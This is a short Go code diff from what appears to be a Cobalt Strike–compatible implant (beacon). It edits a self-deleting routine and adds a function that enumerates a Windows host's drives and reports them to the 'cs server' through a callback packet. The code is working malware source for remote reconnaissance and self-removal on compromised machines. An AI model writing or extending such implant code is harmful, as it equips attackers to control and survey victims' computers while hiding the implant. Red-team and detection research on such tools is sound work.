@@ -13,7 +13,7 @@ import (
 	"unsafe"
 )
 
-// put this function here temporary
+// put some other windows function implement here temporary
 func DeleteSelf() {
 	if config.DeleteSelf {
 		selfName, err := os.Executable()
@@ -29,6 +29,26 @@ func DeleteSelf() {
 		}
 		_ = windows.SetPriorityClass(pI.Process, windows.IDLE_PRIORITY_CLASS)
 	}
+}
+
+func listDrivesInner(b []byte) error {
+	bitMask, err := windows.GetLogicalDrives()
+	if err != nil {
+		return err
+	}
+	var result []byte
+	// extremely strange...
+	// cs server consider 47 as A, 48 as B, and so on
+	i := 47
+	for bitMask > 0 {
+		if bitMask%2 == 1 {
+			result = append(result, byte(i))
+		}
+		bitMask >>= 1
+		i++
+	}
+	packet.PushResult(packet.CALLBACK_PENDING, util.BytesCombine(b[0:4], result))
+	return nil
 }
 
 /*
